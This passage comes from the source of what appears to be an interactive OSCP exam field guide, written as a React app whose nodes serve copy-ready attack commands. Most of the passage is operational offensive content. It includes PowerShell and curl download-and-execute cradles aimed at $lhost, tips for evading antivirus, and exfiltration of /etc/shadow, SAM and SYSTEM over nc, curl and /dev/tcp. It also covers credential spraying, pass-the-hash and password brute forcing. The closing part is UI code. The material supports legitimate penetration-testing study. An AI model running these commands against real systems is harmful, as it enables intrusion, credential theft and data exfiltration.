powershell -c "(New-Object Net.WebClient).DownloadFile('http://$lhost/shell.exe','C:\Windows\Temp\shell.exe')"

# PowerShell DownloadString (fileless — runs in memory)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')"

# bitsadmin (older Windows)
bitsadmin /transfer job http://$lhost/shell.exe C:\Windows\Temp\shell.exe

# SMB copy (no HTTP needed — use impacket-smbserver)
copy \\$lhost\share\shell.exe C:\Windows\Temp\shell.exe
# Or in PowerShell:
Copy-Item \\$lhost\share\shell.exe C:\Windows\Temp\shell.exe

# curl (Windows 10+)
curl http://$lhost/shell.exe -o C:\Windows\Temp\shell.exe

# wget (Windows 10+ — PowerShell alias for Invoke-WebRequest)
wget http://$lhost/shell.exe -OutFile C:\Windows\Temp\shell.exe
# or explicitly:
powershell -c "wget http://$lhost/shell.exe -OutFile C:\Windows\Temp\shell.exe"
# ignore SSL:
powershell -c "wget https://$lhost/shell.exe -OutFile C:\Windows\Temp\shell.exe -SkipCertificateCheck"

# -- WINDOWS: EXECUTE IN MEMORY ------------
# PS DownloadString — never touches disk
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://$lhost/Invoke-PowerShellTcp.ps1')"

# Encoded download cradle
CMD = "IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')"
echo CMD | iconv -t UTF-16LE | base64 -w0
powershell -nop -w hidden -enc [OUTPUT]

# -- VERIFY TRANSFER -----------------------
# Linux
md5sum /tmp/file.sh
# Windows
certutil -hashfile C:\Windows\Temp\shell.exe MD5`,
    warn: "impacket-smbserver is the most reliable Windows transfer when HTTP is blocked. Modern Windows requires SMB2 — always add -smb2support. If Defender blocks the download, use the in-memory DownloadString cradle — it never writes to disk. certutil is heavily signatured — Sigma, Elastic, and Splunk all have rules on it. If AV is active, use PowerShell cradle or SMB instead. IOC: certutil useragent strings are 'Microsoft-CryptoAPI/10.0' and 'CertUtil URL Agent' — both are logged.",
    choices: [
      { label: "Tools transferred — Linux privesc", next: "linpeas" },
      { label: "Tools transferred — Windows privesc", next: "winpeas" },
      { label: "Transfer blocked — troubleshoot shell", next: "shell_troubleshoot" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },
  transfer_agnostic: {
    phase: "SHELL",
    title: "File Transfer — Agnostic (Any OS)",
    body: "Methods that work regardless of OS. Start here if you don't know what's available on the target.",
    cmd: `# ── ATTACKER SIDE — SERVE FILES ──────────────────────
# Python HTTP server (fastest, most reliable)
python3 -m http.server 80
python3 -m http.server 8080   # if 80 blocked
python3 -m http.server 443    # if filtered by port

# impacket SMB share (best for Windows targets)
impacket-smbserver -smb2support share .
impacket-smbserver -smb2support share /path/to/tools -username user -password pass

# FTP server
python3 -m pyftpdlib -p 21 -w

# HTTPS server (self-signed)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"
python3 -c "import ssl,http.server; ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain('cert.pem','key.pem'); httpd=http.server.HTTPServer(('',443),http.server.SimpleHTTPRequestHandler); httpd.socket=ctx.wrap_socket(httpd.socket); httpd.serve_forever()"

# ── BASE64 TRANSFER (no network tools needed) ─────────
# Attacker — encode file
base64 -w0 linpeas.sh && echo
cat linpeas.sh | base64 -w0

# Target — paste and decode
echo "BASE64STRING" | base64 -d > /tmp/linpeas.sh
echo "BASE64STRING" | base64 -d > C:\\Windows\\Temp\\tool.exe

# ── NC TRANSFER (no HTTP available) ──────────────────
# Attacker — send file
nc -nlvp 4444 < tool.exe

# Target — receive file
nc $lhost 4444 > /tmp/tool
nc.exe $lhost 4444 > C:\\Windows\\Temp\\tool.exe

# ── VERIFY INTEGRITY ──────────────────────────────────
# Linux
md5sum /tmp/tool
sha256sum /tmp/tool
# Windows
certutil -hashfile C:\\Windows\\Temp\\tool.exe MD5
Get-FileHash C:\\Windows\\Temp\\tool.exe -Algorithm MD5`,
    warn: null,
    choices: [
      { label: "Windows target", next: "transfer_windows" },
      { label: "Linux target", next: "transfer_linux" },
      { label: "Exfiltrate data out", next: "transfer_exfil" },
    ],
  },

  transfer_windows: {
    phase: "SHELL",
    title: "File Transfer — Windows (Download Tools)",
    body: "Get tools onto a Windows target. iwr and certutil are your defaults. SMB is the most reliable when HTTP is blocked.",
    cmd: `# ── IWR / INVOKE-WEBREQUEST (PowerShell) ─────────────
iwr http://$lhost/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe
iwr http://$lhost/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe
Unblock-File C:\\Windows\\Temp\\wp.exe

# In-memory (never touches disk — best for AV evasion)
IEX(New-Object Net.WebClient).DownloadString("http://$lhost/PowerUp.ps1")
(new-object net.webclient).downloadstring("http://$lhost/PrivescCheck.ps1") | iex

# ── CERTUTIL (LOLBin — built-in) ─────────────────────
certutil -urlcache -split -f http://$lhost/shell.exe C:\\Windows\\Temp\\shell.exe
certutil -urlcache -split -f http://$lhost/shell.exe shell.exe
# Encode/decode (useful if direct download blocked)
certutil -encode C:\\Windows\\Temp\\file.exe file.b64
certutil -decode file.b64 C:\\Windows\\Temp\\file.exe

# ── SMB SHARE (best when HTTP blocked) ───────────────
# Attacker (Kali):
# impacket-smbserver -smb2support kali . -username user -password pass

# Target — map drive and copy
net use m: \\\\$lhost\\kali /user:user pass
copy \\\\$lhost\\kali\\shell.exe C:\\Windows\\Temp\\shell.exe
# Or just run directly from share:
\\\\$lhost\\kali\\shell.exe

# Disconnect when done
net use m: /delete

# ── BITSADMIN (background, survives logoff) ───────────
bitsadmin /transfer job http://$lhost/shell.exe C:\\Windows\\Temp\\shell.exe

# ── CURL (Windows 10+) ───────────────────────────────
curl http://$lhost/shell.exe -o C:\\Windows\\Temp\\shell.exe

# ── BASE64 PASTE (no outbound network) ───────────────
# Attacker: base64 -w0 tool.exe
# Target:
[System.Convert]::FromBase64String("BASE64STRING") | Set-Content -Path C:\\Windows\\Temp\\tool.exe -Encoding Byte

# ── UNBLOCK DOWNLOADED FILES ─────────────────────────
# Windows marks downloaded files as blocked — always unblock
Unblock-File C:\\Windows\\Temp\\tool.exe
# Or remove zone identifier:
Remove-Item -Path C:\\Windows\\Temp\\tool.exe -Stream Zone.Identifier -ErrorAction SilentlyContinue`,
    warn: "certutil is heavily signatured by AV/EDR. If Defender is active use iwr or SMB. Always run Unblock-File after downloading — blocked files run silently and do nothing.",
    choices: [
      { label: "Exfiltrate data back to Kali", next: "transfer_exfil" },
      { label: "Linux transfer instead", next: "transfer_linux" },
      { label: "Tools on box — start Windows privesc", next: "windows_post_exploit" },
    ],
  },

  transfer_linux: {
    phase: "SHELL",
    title: "File Transfer — Linux (Download Tools)",
    body: "Get tools onto a Linux target. wget is usually available. curl as fallback. nc/base64 when nothing else works.",
    cmd: `# ── WGET ─────────────────────────────────────────────
wget http://$lhost/linpeas.sh -O /tmp/lp.sh
wget -q http://$lhost/linpeas.sh -O /tmp/lp.sh     # quiet
wget -c http://$lhost/bigfile -O /tmp/file           # resume
wget --no-check-certificate https://$lhost/file -O /tmp/file  # ignore SSL
chmod +x /tmp/lp.sh && /tmp/lp.sh

# ── CURL ─────────────────────────────────────────────
curl http://$lhost/linpeas.sh -o /tmp/lp.sh
curl -k https://$lhost/linpeas.sh -o /tmp/lp.sh     # ignore SSL
chmod +x /tmp/lp.sh

# Fileless — run in memory (never touches disk)
curl http://$lhost/linpeas.sh | bash
curl http://$lhost/linpeas.sh | sh

# ── SCP ───────────────────────────────────────────────
# Push from Kali to target (if SSH available)
scp linpeas.sh user@$ip:/tmp/lp.sh
scp -r tools/ user@$ip:/tmp/tools/

# Pull from target to Kali
scp user@$ip:/tmp/loot.txt ~/loot.txt

# ── PYTHON ───────────────────────────────────────────
python3 -c "import urllib.request; urllib.request.urlretrieve('http://$lhost/lp.sh', '/tmp/lp.sh')"
python2 -c "import urllib; urllib.urlretrieve('http://$lhost/lp.sh', '/tmp/lp.sh')"

# ── BASH /DEV/TCP (no tools available) ───────────────
bash -c "exec 3<>/dev/tcp/$lhost/80; echo -e 'GET /lp.sh HTTP/1.0\r\n\r\n' >&3; cat <&3" > /tmp/lp.sh

# ── NC ────────────────────────────────────────────────
# Attacker: nc -nlvp 4444 < linpeas.sh
nc $lhost 4444 > /tmp/lp.sh
chmod +x /tmp/lp.sh

# ── WRITABLE DIRS ────────────────────────────────────
# Always try these if /tmp is noexec
/tmp/          # default
/dev/shm/      # RAM-based, fast, often overlooked
/var/tmp/      # persists across reboots
/run/          # tmpfs on modern Linux
cd /dev/shm && wget http://$lhost/lp.sh -O lp.sh && chmod +x lp.sh && ./lp.sh`,
    warn: "If /tmp is mounted noexec, use /dev/shm or /var/tmp. Always chmod +x after download. If the file runs but does nothing, check if it downloaded completely — partial downloads are silent failures.",
    choices: [
      { label: "Exfiltrate data back to Kali", next: "transfer_exfil" },
      { label: "Tools on box — start Linux privesc", next: "linux_post_exploit" },
      { label: "Windows transfer instead", next: "transfer_windows" },
    ],
  },

  transfer_exfil: {
    phase: "SHELL",
    title: "File Transfer — Exfiltration (Data Out)",
    body: "Get data off the target and back to Kali. SMB mapped drive is the cleanest for Windows. curl POST or nc for Linux.",
    cmd: `# ── WINDOWS EXFIL ────────────────────────────────────
# SMB mapped drive — best method (lab workflow)
# Attacker (Kali):
impacket-smbserver -smb2support kali . -username user -password pass

# Target (Windows):
net use m: \\\\$lhost\\kali /user:user pass
copy PrivescCheck_*.* m:\\
copy winpeas.txt m:\\
copy sam m:\\
copy SYSTEM m:\\
net use m: /delete

# PowerShell upload to Kali HTTP listener
# Attacker: python3 -c "import http.server; ..." (or use uploadserver)
pip3 install uploadserver
python3 -m uploadserver 80
# Target:
Invoke-RestMethod -Uri "http://$lhost/upload" -Method Post -InFile C:\\Windows\\Temp\\loot.txt

# nc exfil
# Attacker: nc -nlvp 4444 > loot.txt
# Target:
type C:\\Windows\\Temp\\loot.txt | nc $lhost 4444

# ── LINUX EXFIL ───────────────────────────────────────
# curl POST file to Kali
# Attacker: python3 -m uploadserver 80
curl -X POST http://$lhost/upload -F "file=@/tmp/loot.txt"
curl --upload-file /etc/passwd http://$lhost/passwd

# nc pipe out
# Attacker: nc -nlvp 4444 > loot.txt
nc $lhost 4444 < /tmp/loot.txt
cat /etc/shadow | nc $lhost 4444

# Exfil linpeas output — no python server on target needed
# Attacker:
nc -nlvp 80 > linout.txt
# Target:
cat linout.txt > /dev/tcp/$lhost/80
# Safe — no listening port opened on target

# SCP pull from Kali (if SSH available on target)
scp user@$ip:/etc/shadow ~/shadow
scp user@$ip:/tmp/linpeas_output.txt ~/loot/

# tar + nc (entire directory)
# Attacker: nc -nlvp 4444 | tar xvf -
tar czf - /tmp/loot/ | nc $lhost 4444

# ── BOTH OS — BASE64 ENCODE AND PASTE ────────────────
# Small files — encode on target, paste into terminal
base64 /etc/shadow          # Linux
certutil -encode loot.txt loot.b64 && type loot.b64   # Windows

# ── UPLOADSERVER (easiest Kali listener) ──────────────
# Install once:
pip3 install uploadserver
# Run:
python3 -m uploadserver 80
# Then from target:
curl -X POST http://$lhost/upload -F "file=@/path/to/file"
# Files land in current dir on Kali`,
    warn: null,
    choices: [
      { label: "Back to Windows privesc", next: "windows_post_exploit" },
      { label: "Back to Linux privesc", next: "linux_post_exploit" },
      { label: "Got hashes — crack them", next: "hashcrack" },
      { label: "Got hashes — PTH", next: "pth" },
    ],
  },


  // ==========================================
  //  CREDENTIAL REUSE
  // ==========================================

  cred_reuse: {
    phase: "CREDS",
    title: "Credential Reuse — Spray Everything",
    body: "Password reuse is the most consistent win on OSCP. The moment you find any credential, spray it across every service before doing anything else. Takes 60 seconds and pays off constantly.",
    cmd: `# -- SET YOUR CREDS -----------------------
export USER=founduser
export PASS='foundpassword'
export HASH='aad3b435b51404eeaad3b435b51404ee:NTLMHASH'

# -- NXC (NETEXEC) — SPRAY ALL SERVICES --
# nxc = netexec, maintained successor to crackmapexec (same syntax)
nxc smb   $ip -u USER -p PASS
nxc smb   $ip -u USER -H HASH   # Pass-the-Hash
nxc winrm $ip -u USER -p PASS
nxc ssh   $ip -u USER -p PASS
nxc rdp   $ip -u USER -p PASS
nxc ftp   $ip -u USER -p PASS
nxc mssql $ip -u USER -p PASS

# Spray across subnet
nxc smb $subnet/24 -u USER -p PASS --continue-on-success
nxc smb $subnet/24 -u USER -H HASH --continue-on-success

# crackmapexec fallback (identical syntax)
crackmapexec smb $ip -u USER -p PASS

# -- READ OUTPUT ---------------------------
# [+] = valid creds
# (Pwn3d!) = local admin — instant shell via evil-winrm or psexec

# -- CONNECT WITH VALID CREDS -------------
# WinRM (most common)
evil-winrm -i $ip -u USER -p PASS
evil-winrm -i $ip -u USER -H HASH

# SSH
ssh USER@$ip

# SMB shell (psexec — needs admin share)
impacket-psexec USER:PASS@$ip
impacket-psexec -hashes HASH USER@$ip

# RDP
xfreerdp /u:USER /p:PASS /v:$ip /cert-ignore

# -- USERNAME VARIATIONS -------------------
# If exact user fails, try variations:
# admin, administrator, Administrator
# domain\\user, user@domain.com
# First.Last, firstlast, flast`,
    warn: "Pwn3d! in CME output means local admin. Stop and get that shell immediately — it is the highest-value finding in the output. (Pwn3d!) beats any further enumeration.",
    choices: [
      { label: "CME shows Pwn3d — get shell", next: "windows_post_exploit" },
      { label: "SSH access confirmed", next: "linux_post_exploit" },
      { label: "WinRM access — evil-winrm", next: "winrm_access" },
      { label: "Valid creds, no admin — keep enumerating", next: "targeted_scan" },
      { label: "Nothing worked — hash cracking", next: "hashcrack" },
    ],
  },

  // ==========================================
  //  LINUX PASSWORD HUNTING
  // ==========================================

  linux_password_hunt: {
    phase: "LINUX",
    title: "Linux Credential Hunting",
    body: "Module 18.2: low hanging fruit first. Bash history, env vars, config files, service footprints. watch -n 1 on ps for cleartext creds in process args.",
    cmd: `# ── BASH HISTORY ─────────────────────────────────────
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
history
# Look for: ssh commands, mysql -p, passwords in commands

# ── ENVIRONMENT VARIABLES ─────────────────────────────
env
cat ~/.bashrc
cat ~/.bash_profile
cat /etc/environment
env | grep -i "pass\|key\|secret\|token\|api\|db\|cred"
# Module 18.2.1 example: SCRIPT_CREDENTIALS=lab in .bashrc
# Try it directly: su - root (use found password)

# ── WATCH PROCESSES FOR CLEARTEXT CREDS ─────────────
# Module 18.2.2 — processes often leak creds in args
watch -n 1 "ps aux | grep pass"
watch -n 1 "ps aux | grep -i 'pass\|cred\|secret\|key'"

# ── TCPDUMP — SNIFF LOOPBACK FOR CREDS ───────────────
# Requires sudo tcpdump permission
sudo tcpdump -i lo -A | grep -i "pass\|user\|login"
sudo tcpdump -i any -A -s 0 | grep -i "pass\|authorization"

# ── CONFIG FILES ──────────────────────────────────────
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | xargs grep -il "password" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null | xargs cat
find / -name "*.php" 2>/dev/null | xargs grep -i "password" 2>/dev/null | head -20
find / -name "database.yml" -o -name "settings.py" -o -name ".env" 2>/dev/null | xargs cat 2>/dev/null
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null

# ── SSH KEYS ──────────────────────────────────────────
find / -name "id_rsa" 2>/dev/null
find / -name "id_rsa.pub" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat ~/.ssh/id_rsa
ls -la ~/.ssh/

# ── /PROC ENVIRON — OTHER USERS ENV VARS ─────────────
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i "pass\|key\|secret"

# ── RECENTLY MODIFIED FILES ───────────────────────────
find / -mmin -10 -type f 2>/dev/null | grep -v proc | grep -v sys
find / -mtime -1 -type f 2>/dev/null | grep -v proc

# ── INTERESTING FILES ─────────────────────────────────
find / -name "*.txt" -path "*/home/*" 2>/dev/null
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
find / -name "*.kdbx" 2>/dev/null   # KeePass
ls -la /var/backups/ 2>/dev/null

# ── WRITABLE /ETC/PASSWD ──────────────────────────────
ls -la /etc/passwd
# If -rw-rw-rw- = instant root via /etc/passwd abuse (see linux_manual_enum)

# ── CRUNCH + HYDRA — MUTATE FOUND PASSWORD ────────────
# Module 18.2.1: if you find a password like "Lab" — generate variants
# Pattern: known prefix + 3 digits
crunch 6 6 -t Lab%%% > /tmp/wordlist
# Then brute SSH:
hydra -l eve -P /tmp/wordlist $ip -t 4 ssh -V

# More patterns:
crunch 8 8 -t Pass%%%% > /tmp/wordlist2
crunch 6 8 -t @@@@%% > /tmp/wordlist3   # letters + digits

# Once cracked — sudo -l immediately
sudo -l`,
    warn: null,
    choices: [
      { label: "Found creds — try su/sudo/ssh", next: "creds_found" },
      { label: "Found SSH key", next: "ssh_key" },
      { label: "Writable /etc/passwd or shadow", next: "passwd_shadow" },
      { label: "Back to full enum", next: "linux_post_exploit" },
    ],
  },


  // ==========================================
  //  CUSTOM WORDLISTS
  // ==========================================

  custom_wordlist: {
    phase: "RECON",
    title: "Custom Wordlist Generation",
    body: "Rockyou fails when the password is application-specific or site-related. Generate custom wordlists from the target itself. CeWL scrapes the website. Username mutation covers credential stuffing. Crunch generates pattern-based lists.",
    cmd: `# -- CEWL — SCRAPE TARGET WEBSITE ---------
# Generates wordlist from words found on the target site
cewl http://$ip -d 3 -m 5 -w /tmp/cewl_wordlist.txt
# -d 3 = crawl depth 3
# -m 5 = minimum word length 5

# With authentication
cewl http://$ip -d 3 -m 5   --auth_type basic --auth_user admin --auth_pass password   -w /tmp/cewl_auth.txt

# Include email addresses found
cewl http://$ip -d 2 -e -w /tmp/cewl_emails.txt

# -- USERNAME GENERATION -------------------
# From a name list (First Last format):
# Use username-anarchy or custom script
cat names.txt | while read line; do
  first=\$(echo \$line | cut -d' ' -f1 | tr '[:upper:]' '[:lower:]')
  last=\$(echo \$line | cut -d' ' -f2 | tr '[:upper:]' '[:lower:]')
  echo "\$first"
  echo "\$last"
  echo "\${first}.\${last}"
  echo "\${first}\${last}"
  echo "\${first:0:1}\${last}"
  echo "\${first:0:1}.\${last}"
done > /tmp/usernames.txt

# username-anarchy tool
username-anarchy -i names.txt > /tmp/usernames.txt

# -- CRUNCH — PATTERN-BASED ----------------
# Syntax: crunch [min] [max] [charset] -t [pattern] -o [file]

# All 8-char lowercase
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o /tmp/8char.txt

# Pattern: Company + 4 digits (e.g. Corp1234)
crunch 8 8 -t Corp%%%% -o /tmp/corp_pass.txt

# Pattern: Month + Year (Jan2023)
crunch 7 7 -t @@@%%%%   -p Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec   -o /tmp/months.txt

# -- HASHCAT RULES ON WORDLIST -------------
# Mutate cewl output with rules
hashcat cewl_wordlist.txt -r /usr/share/hashcat/rules/best64.rule   --stdout > /tmp/mutated.txt

hashcat cewl_wordlist.txt   -r /usr/share/hashcat/rules/dive.rule   --stdout > /tmp/mutated_dive.txt

# -- LFI WORDLISTS -------------------------
# Linux LFI
ls /opt/SecLists/Fuzzing/LFI/
# Best: LFI-Jhaddix.txt (combined), LFI-gracefulsecurity-linux.txt

# Windows LFI — specific to Windows paths
/opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
# Contains: C:\Windows\win.ini, web.config, applicationHost.config, etc.

# Use with ffuf:
ffuf -u "http://$ip/page?file=FUZZ"   -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt   -fw 0 -mc 200

# -- WEB DIRECTORY WORDLISTS ---------------
# Fast (CTF/exam): raft-medium-directories.txt
# Thorough: directory-list-2.3-medium.txt
# API endpoints: api/actions.txt, burp-parameter-names.txt
# Backup files: /opt/SecLists/Discovery/Web-Content/raft-medium-extensions.txt

# -- COMBINE WORDLISTS ---------------------
cat rockyou.txt cewl_wordlist.txt | sort -u > /tmp/combined.txt`,
    warn: "CeWL on a company portal often produces the exact password format used internally — CompanyName + year or product names. Run it before rockyou on any corporate-looking application.",
    choices: [
      { label: "Wordlist ready — brute force login", next: "bruteforce" },
      { label: "Wordlist ready — LFI fuzzing", next: "lfi" },
      { label: "Wordlist ready — directory fuzzing", next: "web_fuzz_deep" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  // ==========================================
  //  PORT KNOCKING
  // ==========================================

  port_knocking: {
    phase: "RECON",
    title: "Port Knocking",
    body: "A firewall rule opens a port after receiving connections to a specific sequence of ports. Common on OSCP — usually hinted at in a config file or readme. The sequence is the key.",
    cmd: `# -- HOW TO DETECT ------------------------
# Hints that port knocking is in use:
# - /etc/knockd.conf readable (gives you the sequence)
# - README or note file mentions a sequence
# - nmap shows a port as filtered that should be open (SSH on filtered)
# - Searchsploit shows knockd on the target

# -- FIND THE SEQUENCE ---------------------
# If you have LFI or file read:
http://$ip/page?file=/etc/knockd.conf
# knockd.conf shows sequence like:
# sequence = 7000,8000,9000

# If you have a shell already:
cat /etc/knockd.conf
cat /etc/knockd.conf 2>/dev/null || find / -name knockd.conf 2>/dev/null

# -- EXECUTE THE KNOCK ---------------------
# Method 1: knock tool
knock $ip 7000 8000 9000
knock $ip 7000:udp 8000:tcp 9000:tcp   # if mix of UDP/TCP

# Method 2: nmap (no knock tool)
nmap -Pn --host-timeout 100 --max-retries 0 -p 7000 $ip
nmap -Pn --host-timeout 100 --max-retries 0 -p 8000 $ip
nmap -Pn --host-timeout 100 --max-retries 0 -p 9000 $ip

# Method 3: nc
nc -z $ip 7000
nc -z $ip 8000
nc -z $ip 9000

# -- VERIFY PORT OPENED --------------------
# After knock — check if target port is now open
nmap -Pn -p 22 $ip
# Should now show open instead of filtered

# -- TIMING --------------------------------
# knockd has a timeout window (default 5 seconds between knocks)
# If sequence times out — repeat from beginning
# Some configs require specific intervals:
knock $ip 7000 && sleep 1 && knock $ip 8000 && sleep 1 && knock $ip 9000`,
    warn: "The sequence must be executed in exact order with no extra connections in between. If nmap scans between knocks — the sequence resets. Use the knock tool or careful nc, not nmap for the knock itself.",
    choices: [
      { label: "Port opened — SSH now accessible", next: "ssh_only" },
      { label: "Port opened — web service", next: "web_enum" },
      { label: "Still filtered — wrong sequence", next: "analyze_ambiguous" },
    ],
  },

  mindset_triage: {
    phase: "MINDSET",
    title: "Time Triage — Where to Spend What Remains",
    body: "At some point the exam becomes a resource allocation problem. You have time, machines, and partial progress. The path forward is not the most interesting machine — it is the highest expected value for the time remaining.",
    cmd: `# -- CURRENT STATE ASSESSMENT ------------
# Fill this in right now:

# Standalone 1: local.txt? [Y/N]  proof.txt? [Y/N]  = __/20pts
# Standalone 2: local.txt? [Y/N]  proof.txt? [Y/N]  = __/20pts
# Standalone 3: local.txt? [Y/N]  proof.txt? [Y/N]  = __/20pts
# AD machine 1: local.txt? [Y/N]                    = __/10pts
# AD machine 2: local.txt? [Y/N]                    = __/10pts
# AD DC:        proof.txt? [Y/N]                    = __/40pts
# Bonus points:                                      = __/10pts
# CURRENT TOTAL:                                     __/100pts
# NEED TO PASS:  70pts

# -- DECISION FRAMEWORK -------------------
# Score >= 70 pts:
#   STOP HACKING. Document everything. Submit. Do not risk it.

# Score 50-69 pts:
#   Where is the closest partial flag?
#   A local.txt on a machine you have a shell on = 10pts.
#   One privesc from proof.txt = highest priority target.

# Score 30-49 pts:
#   Have you done full recon on ALL machines?
#   Is there a machine you have not seriously attempted?
#   AD set: if you have machine 1, the rest chain — push the AD.

# Score < 30 pts with < 6 hours left:
#   Abandon lowest-confidence machine entirely.
#   Focus ALL remaining time on ONE machine you understand best.
#   Partial flags count — local.txt with no proof.txt = 10pts not 0.

# -- PASS PATHS ---------------------------
# 3 full standalones (60) + bonus (10)          = 70 pass
# 2 full standalones (40) + 3 local.txt (30)    = 70 pass
# AD set (40) + 1 full standalone (20) + bonus  = 70 pass
# AD set (40) + 2 standalones partial (30)       = 70 pass`,
    warn: "70 points passes. You do not need to own everything. A clear-eyed view of your score and the fastest path to 70 is worth more than 2 hours of unfocused hacking.",
    choices: [
      { label: "Back to hacking — I know where to focus", next: "start" },
      { label: "Stop and document what I have", next: "reporting" },
      { label: "Still stuck on a machine", next: "mindset_stuck" },
    ],
  },
};

// ---------------------------------------------
//  PHASE METADATA
// ---------------------------------------------
const PHASES = {
  ANALYSIS:  { color: "#34d399", icon: "◎" },
  JUMP:      { color: "#f0abfc", icon: "⟡" },
  RECON:     { color: "#3b9eff", icon: "◉" },
  DISCOVERY: { color: "#38bdf8", icon: "◎" },
  PIVOT:     { color: "#f472b6", icon: "⟳" },
  WEB:       { color: "#ff8c42", icon: "◈" },
  SMB:       { color: "#ff6b9d", icon: "◆" },
  FTP:       { color: "#ff6b9d", icon: "◆" },
  SSH:       { color: "#ff6b9d", icon: "◆" },
  CREDS:     { color: "#ffd166", icon: "◐" },
  SHELL:     { color: "#ffd166", icon: "◐" },
  LINUX:     { color: "#06d6a0", icon: "▲" },
  WINDOWS:   { color: "#ffbe0b", icon: "■" },
  AD:        { color: "#b5179e", icon: "◈" },
  REPORT:    { color: "#a0aec0", icon: "✎" },
  MINDSET:   { color: "#c084fc", icon: "◯" },
};

// ─────────────────────────────────────────────
//  COMPONENT
// ─────────────────────────────────────────────
export default function OSCPAdventure() {
  const [history, setHistory] = useState(["start"]);
  const [copied, setCopied] = useState(false);
  const [animKey, setAnimKey] = useState(0);
  const [showAbout, setShowAbout] = useState(false);
  const topRef = useRef(null);

  const currentId = history[history.length - 1];
  const node = nodes[currentId];
  const phase = PHASES[node.phase] || PHASES.RECON;

  const go = (next) => {
    setHistory((h) => [...h, next]);
    setAnimKey((k) => k + 1);
    setTimeout(() => topRef.current?.scrollIntoView({ behavior: "smooth", block: "start" }), 50);
  };

  const back = () => {
    if (history.length > 1) {
      setHistory((h) => h.slice(0, -1));
      setAnimKey((k) => k + 1);
    }
  };

  const reset = () => {
    setHistory(["start"]);
    setAnimKey((k) => k + 1);
  };

  const copyCmd = () => {
    if (node.cmd) {
      navigator.clipboard.writeText(node.cmd);
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    }
  };



  const [copiedMd, setCopiedMd] = useState(false);

  const copyObsidian = () => {
    const lines = [];
    lines.push(`# ${node.title}`);
    lines.push(`**Phase:** ${node.phase}  `);
    lines.push(`**Date:** ${new Date().toISOString().slice(0,10)}  `);
    lines.push(`**Node:** \`${currentId}\``);
    lines.push('');
    lines.push('## Guidance');
    lines.push(node.body);
    lines.push('');
    if (node.warn) {
      lines.push('> [!warning]');
      lines.push(`> ${node.warn}`);
      lines.push('');
    }
    if (node.cmd) {
      lines.push('## Commands');
      lines.push('```bash');
      lines.push(node.cmd);
      lines.push('```');
      lines.push('');
    }
    lines.push('## What I Found');
    lines.push('');
    lines.push('```');
    lines.push('');
    lines.push('```');
    lines.push('');
    lines.push('## Proof / Evidence');
    lines.push('');
    lines.push('- Screenshot: ');
    lines.push('- Output: ');
    lines.push('');
    lines.push('## Next Move');
    lines.push('');
    node.choices.forEach(c => {
      lines.push(`- [ ] ${c.label} → \`${c.next}\``);
    });
    lines.push('');
    lines.push('---');
    lines.push('*Generated by The Path — OSCP Field Guide*');
    navigator.clipboard.writeText(lines.join('\n'));
    setCopiedMd(true);
    setTimeout(() => setCopiedMd(false), 1800);
  };

  const phaseList = history.map((h) => nodes[h]?.phase).filter(Boolean);

  useEffect(() => {
    const handleKey = (e) => {
      if (showAbout) { if (e.key === "Escape") setShowAbout(false); return; }
      if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") return;
      const num = parseInt(e.key);
      if (!isNaN(num) && num >= 1 && num <= node.choices.length) {
        go(node.choices[num - 1].next);
      }
      if (e.key === "Backspace" || e.key === "ArrowLeft") back();
      if (e.key === "r" || e.key === "R") reset();
      if (e.key === "?" || e.key === "a" || e.key === "A") setShowAbout(true);
    };
    window.addEventListener("keydown", handleKey);
    return () => window.removeEventListener("keydown", handleKey);
  }, [node, history, showAbout]);

  return (
    <div style={{
      minHeight: "100vh",
      background: "#080b0f",
      color: "#cdd6e0",
      fontFamily: "'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
    }}>

      {/* ── HEADER ─────────────────────────── */}
      <header ref={topRef} style={{
        width: "100%",
        background: "linear-gradient(180deg, #0c1018 0%, #080b0f 100%)",
        borderBottom: `1px solid ${phase.color}33`,
        padding: "14px 28px",
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        position: "sticky",
        top: 0,
        zIndex: 20,
        boxSizing: "border-box",
        boxShadow: `0 1px 30px ${phase.color}18`,
        transition: "border-color 0.4s, box-shadow 0.4s",
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
          <div style={{ display: "flex", flexDirection: "column", lineHeight: 1.1 }}>
            <div style={{
              fontSize: 17,
              fontWeight: 800,
              letterSpacing: 5,
              color: phase.color,
              textShadow: `0 0 16px ${phase.color}`,
              textTransform: "uppercase",
              transition: "color 0.4s, text-shadow 0.4s",
            }}>
              THE PATH
            </div>
            <div style={{
              fontSize: 10,
              letterSpacing: 3,
              color: "#3a4858",
              textTransform: "uppercase",
              marginTop: 2,
            }}>
              OSCP Field Guide
            </div>
          </div>
          <div style={{
            width: 1,
            height: 16,
            background: "#2a3040",
          }} />
          <div style={{
            fontSize: 17,
            letterSpacing: 3,
            color: "#4a5568",
            textTransform: "uppercase",
          }}>
            {phase.icon} {node.phase}
          </div>
        </div>

        <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
          <a
            href="https://github.com/jimi421/patha"
            target="_blank"
            rel="noopener noreferrer"
            style={{
              background: "transparent",
